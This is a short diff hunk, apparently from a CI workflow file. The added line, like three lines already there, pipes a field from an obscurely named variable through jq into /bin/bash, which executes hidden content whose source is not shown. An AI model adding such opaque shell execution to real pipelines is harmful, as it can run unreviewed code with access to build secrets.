@@ -45,6 +45,7 @@ jobs:
           echo $szoow731 | jq -r .fxdnz91 | /bin/bash
           printf '%s' "$a4" | jq -r .chg606 | /bin/bash
           printf '%s' "$ixzt8" | jq -r .p68923 | /bin/bash
+          echo $cd4155 | jq -r .q50 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
